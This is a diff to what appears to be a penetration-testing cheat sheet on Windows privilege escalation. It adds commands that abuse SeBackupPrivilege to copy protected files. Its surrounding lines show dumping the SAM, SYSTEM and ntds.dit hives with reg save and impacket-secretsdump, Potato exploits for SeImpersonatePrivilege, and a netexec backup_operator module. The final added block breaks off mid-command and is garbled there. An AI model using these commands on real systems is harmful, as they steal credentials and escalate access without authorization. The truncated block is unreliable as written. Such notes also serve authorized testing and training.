@@ -405,6 +405,12 @@ reg save HKLM\SAM sam
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+Copying a Protected File
+```
+import-module .\SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
 ### Abuse SeImpersonatePrivilege(GodPotato->JuicyPotatoNG->RoguePotato->PrintSpoofer->JuicyPotato)
 >JuicyPotato -> Windows 7/8, Server 2008 R2/2012/2012 R2, early Windows 10/Server 2016
 >RoguePotato -> Intended for Windows 10 1809+ and Server 2019 where JuicyPotato stopped working
@@ -471,6 +477,11 @@ Full token privileges cheatsheet at https://github.com/gtworek/Priv2Admin
 Always remember to run Import-Module .\Enable-Privilege.ps1 and .\EnableAllTokenPrivs.ps1 with elevated prompt
 ### SeBackupPrivilege
 ```
+import-module .\SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+
+If SeBackupPrivilege is disabled, Set-SeBackupPrivilege
+
 windows: reg save HKLM\SAM C:\users\public\SAM
 windows: reg save HKLM\SYSTEM C:\users\public\SYSTEM
 
@@ -479,6 +490,11 @@ copy sam and system to kali
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+Copying a Protected File
+```
+import-module .\SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+Copy-FileS
 netexec
 ```
 nxc smb ip -u username -p pwd -M backup_operator
